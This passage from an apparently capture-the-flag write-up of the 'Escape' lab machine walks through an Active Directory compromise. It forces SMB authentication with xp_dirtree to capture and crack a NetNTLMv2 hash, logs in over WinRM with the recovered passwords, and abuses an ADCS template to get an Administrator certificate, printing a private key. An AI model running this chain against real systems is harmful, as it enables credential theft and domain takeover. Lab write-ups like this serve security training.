<span class="w">    </span><span class="n">Always</span><span class="w"> </span><span class="n">serving</span><span class="w"> </span><span class="n">EXE</span><span class="w">         </span><span class="o">[</span><span class="n">OFF</span><span class="o">]</span>
<span class="w">    </span><span class="n">Serving</span><span class="w"> </span><span class="n">EXE</span><span class="w">                </span><span class="o">[</span><span class="n">OFF</span><span class="o">]</span>
<span class="w">    </span><span class="n">Serving</span><span class="w"> </span><span class="n">HTML</span><span class="w">               </span><span class="o">[</span><span class="n">OFF</span><span class="o">]</span>
<span class="w">    </span><span class="n">Upstream</span><span class="w"> </span><span class="n">Proxy</span><span class="w">             </span><span class="o">[</span><span class="n">OFF</span><span class="o">]</span>

<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Poisoning</span><span class="w"> </span><span class="nl">Options</span><span class="p">:</span>
<span class="w">    </span><span class="n">Analyze</span><span class="w"> </span><span class="n">Mode</span><span class="w">               </span><span class="o">[</span><span class="n">OFF</span><span class="o">]</span>
<span class="w">    </span><span class="n">Force</span><span class="w"> </span><span class="n">WPAD</span><span class="w"> </span><span class="n">auth</span><span class="w">            </span><span class="o">[</span><span class="n">OFF</span><span class="o">]</span>
<span class="w">    </span><span class="n">Force</span><span class="w"> </span><span class="n">Basic</span><span class="w"> </span><span class="n">Auth</span><span class="w">           </span><span class="o">[</span><span class="n">OFF</span><span class="o">]</span>
<span class="w">    </span><span class="n">Force</span><span class="w"> </span><span class="n">LM</span><span class="w"> </span><span class="n">downgrade</span><span class="w">         </span><span class="o">[</span><span class="n">OFF</span><span class="o">]</span>
<span class="w">    </span><span class="n">Fingerprint</span><span class="w"> </span><span class="n">hosts</span><span class="w">          </span><span class="o">[</span><span class="n">OFF</span><span class="o">]</span>

<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Generic</span><span class="w"> </span><span class="nl">Options</span><span class="p">:</span>
<span class="w">    </span><span class="n">Responder</span><span class="w"> </span><span class="n">NIC</span><span class="w">              </span><span class="o">[</span><span class="n">tun0</span><span class="o">]</span>
<span class="w">    </span><span class="n">Responder</span><span class="w"> </span><span class="n">IP</span><span class="w">               </span><span class="o">[</span><span class="n">10.10.16.4</span><span class="o">]</span>
<span class="w">    </span><span class="n">Challenge</span><span class="w"> </span><span class="k">set</span><span class="w">              </span><span class="o">[</span><span class="n">random</span><span class="o">]</span>
<span class="w">    </span><span class="n">Don</span><span class="s1">'t Respond To Names     ['</span><span class="n">ISATAP</span><span class="err">']</span>

<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="k">Current</span><span class="w"> </span><span class="k">Session</span><span class="w"> </span><span class="nl">Variables</span><span class="p">:</span>
<span class="w">    </span><span class="n">Responder</span><span class="w"> </span><span class="n">Machine</span><span class="w"> </span><span class="n">Name</span><span class="w">     </span><span class="o">[</span><span class="n">WIN-AFNXB8Z9RCY</span><span class="o">]</span>
<span class="w">    </span><span class="n">Responder</span><span class="w"> </span><span class="k">Domain</span><span class="w"> </span><span class="n">Name</span><span class="w">      </span><span class="o">[</span><span class="n">GMQ6.LOCAL</span><span class="o">]</span>
<span class="w">    </span><span class="n">Responder</span><span class="w"> </span><span class="n">DCE</span><span class="o">-</span><span class="n">RPC</span><span class="w"> </span><span class="n">Port</span><span class="w">     </span><span class="o">[</span><span class="n">46170</span><span class="o">]</span>

<span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="n">Listening</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">events</span><span class="p">...</span>
</code></pre><br style="line-height: 0.5;"/></div>

I am going to execute the following command in the interactive console obtained with <code>mssqlclient</code>:<br/><br/>
<div class="codehilite"><pre><span></span><code>SQL&gt; xp_dirtree "\\10.10.16.4\test"
</code></pre><br style="line-height: 0.5;"/></div>

We will wait a few seconds, and if everything goes well, the response server should have captured the request.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="o">[</span><span class="n">SMB</span><span class="o">]</span><span class="w"> </span><span class="n">NTLMv2</span><span class="o">-</span><span class="n">SSP</span><span class="w"> </span><span class="n">Client</span><span class="w">   </span><span class="err">:</span><span class="w"> </span><span class="mf">10.10.11.202</span>
<span class="o">[</span><span class="n">SMB</span><span class="o">]</span><span class="w"> </span><span class="n">NTLMv2</span><span class="o">-</span><span class="n">SSP</span><span class="w"> </span><span class="n">Username</span><span class="w"> </span><span class="err">:</span><span class="w"> </span><span class="n">sequel</span><span class="err">\</span><span class="n">sql_svc</span>
<span class="o">[</span><span class="n">SMB</span><span class="o">]</span><span class="w"> </span><span class="n">NTLMv2</span><span class="o">-</span><span class="n">SSP</span><span class="w"> </span><span class="n">Hash</span><span class="w">     </span><span class="err">:</span><span class="w"> </span><span class="nl">sql_svc</span><span class="p">:</span><span class="err">:</span><span class="nl">sequel</span><span class="p">:</span><span class="mi">0</span><span class="nl">b63b108f4a834f8</span><span class="p">:</span><span class="mi">8545469</span><span class="nl">C3917EA7AF1954B38B72246F0</span><span class="p">:</span><span class="mi">010100000000000000</span><span class="n">D0F5034AA7D901954F07D92C966FAF00000000020008003200370038005A0001001E00570049004E002D00440037003100360030005A004D00590047004500300004003400570049004E002D00440037003100360030005A004D0059004700450030002E003200370038005A002E004C004F00430041004C00030014003200370038005A002E004C004F00430041004C00050014003200370038005A002E004C004F00430041004C000700080000D0F5034AA7D90106000400020000000800300030000000000000000000000000300000D94D6229FBB3E411964E8C154976D855F2D964620B4B3CE73032483DFA79F67B0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0034000000000000000000</span>
</code></pre><br style="line-height: 0.5;"/></div>

We have successfully obtained the Net-NTLMv2 hash of the user <code>sql_svc</code>. Now, the idea is to store it in a file and perform a brute-force attack to try to obtain the plaintext password.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="err">$</span><span class="w"> </span><span class="n">john</span><span class="w"> </span><span class="o">-</span><span class="nl">w</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="k">file</span>
<span class="k">Using</span><span class="w"> </span><span class="k">default</span><span class="w"> </span><span class="k">input</span><span class="w"> </span><span class="nl">encoding</span><span class="p">:</span><span class="w"> </span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="n">Loaded</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="p">(</span><span class="n">netntlmv2</span><span class="p">,</span><span class="w"> </span><span class="n">NTLMv2</span><span class="w"> </span><span class="n">C</span><span class="o">/</span><span class="n">R</span><span class="w"> </span><span class="o">[</span><span class="n">MD4 HMAC-MD5 32/64</span><span class="o">]</span><span class="p">)</span>
<span class="n">Will</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="n">OpenMP</span><span class="w"> </span><span class="n">threads</span>
<span class="n">Press</span><span class="w"> </span><span class="s1">'q'</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">abort</span><span class="p">,</span><span class="w"> </span><span class="s1">'h'</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">help</span><span class="p">,</span><span class="w"> </span><span class="n">almost</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="k">key</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">status</span>
<span class="n">REGGIE1234ronnie</span><span class="w"> </span><span class="p">(</span><span class="n">sql_svc</span><span class="p">)</span><span class="w">     </span>
<span class="mi">1</span><span class="n">g</span><span class="w"> </span><span class="mi">0</span><span class="err">:</span><span class="mi">00</span><span class="err">:</span><span class="mi">00</span><span class="err">:</span><span class="mi">19</span><span class="w"> </span><span class="n">DONE</span><span class="w"> </span><span class="p">(</span><span class="mi">2023</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">25</span><span class="w"> </span><span class="mi">09</span><span class="err">:</span><span class="mi">50</span><span class="p">)</span><span class="w"> </span><span class="mf">0.05068</span><span class="n">g</span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="mi">542361</span><span class="n">p</span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="mi">542361</span><span class="n">c</span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="mi">542361</span><span class="n">C</span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="n">RENZOJAVIER</span><span class="p">..</span><span class="n">REDMAN69</span>
<span class="k">Use</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="ss">"--show --format=netntlmv2"</span><span class="w"> </span><span class="n">options</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">display</span><span class="w"> </span><span class="ow">all</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">cracked</span><span class="w"> </span><span class="n">passwords</span><span class="w"> </span><span class="n">reliably</span>
<span class="k">Session</span><span class="w"> </span><span class="n">completed</span><span class="p">.</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

Perfect, we have obtained the password in a readable format, and now we can attempt to use it to authenticate via SMB.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">User</span><span class="o">:</span><span class="w"> </span><span class="n">sql_svc</span>
<span class="n">Password</span><span class="o">:</span><span class="w"> </span><span class="n">REGGIE1234ronnie</span>
</code></pre><br style="line-height: 0.5;"/></div>

Once again, we will use the tool <a href="https://github.com/Porchetta-Industries/CrackMapExec">CrackMapExec</a>.<br/><br/>
<div class="codehilite"><pre><span></span><code>crackmapexec smb 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
</code></pre><br style="line-height: 0.5;"/></div>
<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/5.png?raw=true"/><br/><br/>
We can verify if the user <code>sql_svc</code> belongs to the "Remote Management Users" group, so that we can connect to the Windows Remote Management service using tools like <code>Evil-WinRM</code>.<br/><br/>
<div class="codehilite"><pre><span></span><code>crackmapexec winrm 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
</code></pre><br style="line-height: 0.5;"/></div>
<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/6.png?raw=true"/><br/><br/>
Since the credentials are valid and the user <code>sql_svc</code> belongs to the "Remote Management Users" group, we can attempt to connect to the WinRM service using the tool <code>Evil-WinRM</code>. This will allow us to obtain an interactive console as the user <code>sql_svc</code>.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="err">$</span><span class="w"> </span><span class="n">evil</span><span class="o">-</span><span class="n">winrm</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="mf">10.10.11.202</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s1">'sql_svc'</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="s1">'REGGIE1234ronnie'</span>

<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">sql_svc</span><span class="err">\</span><span class="n">Documents</span><span class="o">&gt;</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

We successfully accessed the system.<br/><br/>
<h4>Shell as Ryan.Cooper:</h4>
While enumerating the system, we discovered a folder named "SQLServer" in the root directory of the system.<br/><br/>
<div class="codehilite"><pre><span></span><code>*Evil-WinRM* PS C:\&gt; ls 


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/1/2023   8:15 PM                PerfLogs
d-r---         2/6/2023  12:08 PM                Program Files
d-----       11/19/2022   3:51 AM                Program Files (x86)
d-----       11/19/2022   3:51 AM                Public
d-----         2/1/2023   1:02 PM                SQLServer
d-r---         2/1/2023   1:55 PM                Users
d-----         2/6/2023   7:21 AM                Windows
</code></pre><br style="line-height: 0.5;"/></div>

By listing the contents of the folder, we can see that there is a subfolder named "Logs." Inside this folder, we found a file called "ERRORLOG.BAK."<br/><br/>
<div class="codehilite"><pre><span></span><code>*Evil-WinRM* PS C:\SQLServer\Logs&gt; ls


    Directory: C:\SQLServer\Logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK


*Evil-WinRM* PS C:\SQLServer\Logs&gt; 
</code></pre><br style="line-height: 0.5;"/></div>

Upon examining the content of the "ERRORLOG.BAK" file, we can see that it stores error logs that have occurred on the SQL server. Furthermore, we can notice that someone has attempted to authenticate with the username "Ryan.Cooper."<br/><br/>
<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/7.png?raw=true"/><br/><br/>
Also, a few lines below, we can see that there have been authentication attempts with the username "NuclearMosquito3." The username is somewhat suspicious. I decided to try authenticating to the SMB service using the username "Ryan.Cooper" and used "NuclearMosquito3" as the password.<br/><br/>
<div class="codehilite"><pre><span></span><code>crackmapexec smb 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
</code></pre><br style="line-height: 0.5;"/></div>
<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/8.png?raw=true"/><br/><br/>
The credentials are correct, and the user "Ryan.Cooper" also has access to the WinRM service. Therefore, using the Evil-WinRM tool again, we can attempt to connect.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="err">$</span><span class="w"> </span><span class="n">evil</span><span class="o">-</span><span class="n">winrm</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="mf">10.10.11.202</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s1">'Ryan.Cooper'</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="s1">'NuclearMosquito3'</span>

<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Ryan</span><span class="p">.</span><span class="n">Cooper</span><span class="err">\</span><span class="n">Documents</span><span class="o">&gt;</span>
</code></pre><br style="line-height: 0.5;"/></div>
<h3><br>Shell as Administrator</br></h3><br>
We have identified the ADCS (Active Directory Certificate Services) service. It is always important to investigate Active Directory Certificate Services in a domain. We can try to do so using the tool <code>crackmapexec</code>.<br/><br/>
It is worth noting that I had some issues with OpenSSL to run this reconnaissance mode, so I had to install a customized version of crackmapexec along with a Python virtual environment.<br/><br/>
<div class="codehilite"><pre><span></span><code>crackmapexec ldap 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3' -M adcs
</code></pre><br style="line-height: 0.5;"/></div>
<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/10.png?raw=true"/><br/><br/>
Once we know that ADCS is operational, we need to identify if there are any insecure configurations in any of the templates. To do this, we will make use of <code>Certify.exe</code>. I obtained this executable file from the SharpCollection repository on GitHub.<br/><br/>
Specifically, I used the version found in the <a href="https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.5_Any">NetFramework_4.5_Any</a> folder.<br/><br/>
The idea is to upload the executable file to the victim machine. For this, we can use the "upload" function of Evil-WinRM.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">upload</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">Escape</span><span class="o">/</span><span class="n">content</span><span class="o">/</span><span class="n">Certify</span><span class="o">.</span><span class="n">exe</span>
</code></pre><br style="line-height: 0.5;"/></div>
<div class="codehilite"><pre><span></span><code><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">Temp</span>\<span class="n">Privesc</span><span class="o">&gt;</span><span class="w"> </span><span class="n">upload</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">elswix</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">Escape</span><span class="o">/</span><span class="n">content</span><span class="o">/</span><span class="n">Certify</span><span class="o">.</span><span class="n">exe</span>

<span class="n">Info</span><span class="p">:</span><span class="w"> </span><span class="n">Uploading</span><span class="w"> </span><span class="n">Certify</span><span class="o">.</span><span class="n">exe</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">Temp</span>\<span class="n">Privesc</span>\<span class="n">Certify</span><span class="o">.</span><span class="n">exe</span>

<span class="n">Data</span><span class="p">:</span><span class="w"> </span><span class="mi">236200</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="mi">236200</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="n">copied</span>

<span class="n">Info</span><span class="p">:</span><span class="w"> </span><span class="n">Upload</span><span class="w"> </span><span class="n">successful</span><span class="o">!</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span><span class="w"> </span><span class="n">PS</span><span class="w"> </span><span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">Temp</span>\<span class="n">Privesc</span><span class="o">&gt;</span><span class="w"> </span>
</code></pre><br style="line-height: 0.5;"/></div>

Now we need to search for vulnerable templates, which we can do as follows:<br/><br/>
<div class="codehilite"><pre><span></span><code>./Certify.exe find /vulnerable /currentuser
</code></pre><br style="line-height: 0.5;"/></div>
<img alt="" src="https://github.com/ElSwix/HTB-WriteUPS/blob/main/EN/Machines/Medium/Escape/img/11.png?raw=true"/><br/><br/>
We can see that a vulnerable template called "UserAuthentication" has been found.<br/><br/>
With this information, we can execute the following command using <code>Certify.exe</code> and passing certain parameters:<br/><br/>
<div class="codehilite"><pre><span></span><code>.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator 
</code></pre><br style="line-height: 0.5;"/></div>

In this command, we are essentially requesting a certificate based on the username we want to impersonate.<br/><br/>
We save the keys returned by the command according to their type. That is, the private key is saved in a .key file, while the public key, which is actually a certificate, is saved in a .pem file.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@parrot</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">private</span><span class="p">.</span><span class="k">key</span>
<span class="o">-----</span><span class="k">BEGIN</span><span class="w"> </span><span class="n">RSA</span><span class="w"> </span><span class="n">PRIVATE</span><span class="w"> </span><span class="k">KEY</span><span class="o">-----</span>
<span class="n">MIIEpAIBAAKCAQEA4p7W</span><span class="o">/</span><span class="n">UJGTpymQtvqptr7MCrinEfitT2MRnvcKdOzE7BWAV84</span>
<span class="n">WwxdkWuYQCEe5lbgnyxlCNDd5DjIvS57KANnpjQHWSjxN2ORQGqegerXCCx66L8J</span>
<span class="mi">5</span><span class="n">D7ZNipMZ01tE6VioKbNMea5fvGLYgB1</span><span class="o">/</span><span class="n">L9maiaKJetPaz4</span><span class="o">+</span><span class="n">RrsFXSvbN1ZQ0eqm</span>
<span class="n">y0P2kljCstUGwRO6oFyQFqYp742</span><span class="o">/</span><span class="n">DsDEknqSlnQSZ3aTCB6YKa</span><span class="o">+</span><span class="n">R3</span><span class="o">/+</span><span class="n">W4T</span><span class="o">+</span><span class="n">ZmoPG</span>
<span class="mi">0</span><span class="n">v891XbNfywaHBX9DYGudzDWl5HHqAJmwRWHaTaVhzB74k</span><span class="o">+</span><span class="n">UJlOHiTzBqFSQT18G</span>
<span class="n">paoUo</span><span class="o">/</span><span class="n">QcPxnNHq50GFG</span><span class="o">/+</span><span class="n">abr8RH49Sqc58gu5QIDAQABAoIBAAibUbzynGr15haZ</span>
<span class="mi">9</span><span class="n">ZJ6tJmCt3KKBGEvwjkXESiBgsaXptyMej5y</span><span class="o">/</span><span class="n">Ma</span><span class="o">+</span><span class="n">GF0vJNZIrGU</span><span class="o">/</span><span class="n">MWMhU5wMUAtn</span>
<span class="n">TYQahQA576GCPY8F</span><span class="o">+</span><span class="n">AlDQ1vZyGrmDZDzWHPTszosZxRxS1g4qsNBMn</span><span class="o">/</span><span class="n">XrGnW0J1b</span>
<span class="ow">OR</span><span class="o">/</span><span class="n">tQP19EzgXdL</span><span class="o">+</span><span class="mi">08</span><span class="n">HaNOcntFXlHeqSm8RZl0pvBLRYd1WFvKkUKW21v5mkz51FG</span>
<span class="n">sEfBSdH7cZ7kWuHoGtHgfTFnCnyYHhUCKzUflM4W0T79TZM6C8v5VGF6e6wlmTyV</span>
<span class="n">Gn0PddOmRphQJ</span><span class="o">+</span><span class="n">KqqIHUJxL388FmDa39dng38uXs77vclZ0qyA8NjxyISgCJ6qDB</span>
<span class="o">//</span><span class="mi">8</span><span class="n">F0E0CgYEA8SYmGb5hc</span><span class="o">/</span><span class="n">RT61Q5swgmuwjKYTn4wWUAyTOq0</span><span class="o">+</span><span class="mi">4</span><span class="n">IqQH7R1wRRIn</span><span class="o">+</span>
<span class="n">fnwYtQeBWxw4</span><span class="o">/</span><span class="n">EB0G</span><span class="o">+</span><span class="mi">91</span><span class="n">lUgEYxUQzIPNZph0Pesw8USdZrfXUKSVpVRVAaQMqXfK</span>
<span class="mi">4</span><span class="n">k8tqqziYtCfEJGC05JQqgFYEQE9tpt3IYSztFo96ZDMWJslpGi28acCgYEA8JOj</span>
<span class="mi">3</span><span class="n">uLTzTqVKObKsOEVwir</span><span class="o">/</span><span class="n">QvB</span><span class="o">+</span><span class="n">hfJL53AeURKKpAYYxQtl8mmot3SuGaSHS7</span><span class="o">/</span><span class="n">SMXJP</span>
<span class="n">AKNGz8XzqreZ20VsYMQiE5aBKnqguFgeBE0NHH2TE3d6m</span><span class="o">+</span><span class="n">wo1FlKl1HpKIAZJ7IE</span>
<span class="n">eG5UrF7zF5rOQbx23LmBpCTEzTgQo</span><span class="o">+</span><span class="n">HSs3retJMCgYEAjTj2HyVrFOkFLE</span><span class="o">/</span><span class="n">K6pnf</span>
<span class="n">dLEVNBMrJrbr2uizJiHEWJWcfpHgWu8lZxVtsraOfrjsdm2YkbOOfLoMN6piiCK3</span>
<span class="mi">61</span><span class="n">lk2c4ef2zbcQhAxC1epc</span><span class="o">/</span><span class="n">ZaHiWIbjRy</span><span class="o">+</span><span class="mi">7</span><span class="n">qo4VTnuLmBGHy58xMCQN4e5zqc0Jg</span>
<span class="n">ZfS8</span><span class="o">+</span><span class="n">OXQVDREN6</span><span class="o">/</span><span class="n">EP6BDYwkCgYEAuiYjSFVO</span><span class="o">+</span><span class="n">Z</span><span class="o">/</span><span class="mi">4</span><span class="n">xns</span><span class="o">+</span><span class="n">HvsrMODAPvWDkPVYki4I</span>
<span class="mi">50</span><span class="n">ZnjF9DT0Rwj8</span><span class="o">/</span><span class="mi">9</span><span class="n">wmZASIssPQqiA6ylQKMWKbLLxi7ml</span><span class="o">+</span><span class="n">nx4DYi</span><span class="o">//</span><span class="n">EW5N2Z</span><span class="o">+</span><span class="n">soD</span>
<span class="o">/+</span><span class="n">P23zKzWP68GmXzecvVkZzJwpLL5BE0sFL</span><span class="o">+</span><span class="n">pZmak4svSWIgvs2zaGUi</span><span class="o">+</span><span class="n">oAFMCmO</span>
<span class="n">NV4</span><span class="o">/</span><span class="n">cI0CgYBalqQDumy56mO4ff7h03wD5fwWOS</span><span class="o">+</span><span class="n">VfB8wAijmtR1g5FP7hY645JbA</span>
<span class="mi">8</span><span class="n">Bnx9vsNx4D89DBCn2VjleCGc0JagjsZhvotMjwVqFhA61kNCZ</span><span class="o">+</span><span class="mi">7</span><span class="n">GEykoEAgdkoF</span>
<span class="o">//</span><span class="mi">06</span><span class="n">DTGg</span><span class="o">/</span><span class="n">NjyYWstCCe5DLst1nGQYyYfAU3uSQvAibj3BemZhu211w</span><span class="o">==</span>
<span class="c1">-----END RSA PRIVATE KEY-----</span>
</code></pre><br style="line-height: 0.5;"/></div>
<div class="codehilite"><pre><span></span><code>elswix@parrot$ cat cert.pem
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAApmSQbdZ0g+nQAAAAAACjANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwNjI1MjMxNjAzWhcNMjUwNjI1
MjMyNjAzWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDintb9QkZOnKZC2+qm2vswKuKc
R+K1PYxGe9wp07MTsFYBXzhbDF2Ra5hAIR7mVuCfLGUI0N3kOMi9LnsoA2emNAdZ
KPE3Y5FAap6B6tcILHrovwnkPtk2KkxnTW0TpWKgps0x5rl+8YtiAHX8v2ZqJool
609rPj5GuwVdK9s3VlDR6qbLQ/aSWMKy1QbBE7qgXJAWpinvjb8OwMSSepKWdBJn
dpMIHpgpr5Hf/5bhP5mag8bS/z3Vds1/LBocFf0Nga53MNaXkceoAmbBFYdpNpWH
MHviT5QmU4eJPMGoVJBPXwalqhSj9Bw/Gc0ernQYUb/5puvxEfj1KpznyC7lAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFPpbeu5bjpU/uMHIGIsWv2pTibBF
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAhw1QMnM+bOXjhslU/I2JLDcjrTKxlzkmONeHmQcj1ihl2Eo+4wblJbfj
3xaMu2pk5SxWWnl3qYz5lbg62rfJaQWf/UQqFZ5hU3piT4H075pOJb7V1MQGyx/W
NPB3Ya61DO7clWjiBgqBa9/6EeyunZq7wdyba4RCjFtszyOaWXRjEke50/s12ns8
i/7oWqLeFXKqFCbqvLZ/NmcCDQL81OeDkpzAqlXDOKV7ahNVKd7d0heTsaWU2NCp
1qdbN8hGE+4OZCQ64XOz/nFJpD6/oVmYEZEF3z8B9YKOTAW9uUo33wxHN5kTwjxi
WV6ij+c2FzHM+gDsMhFkpSP0AIXm7w==
-----END CERTIFICATE-----
</code></pre><br style="line-height: 0.5;"/></div>

With this information, we can execute the following command to obtain a similar result to the command executed with <code>Certify.exe</code>:<br/><br/>
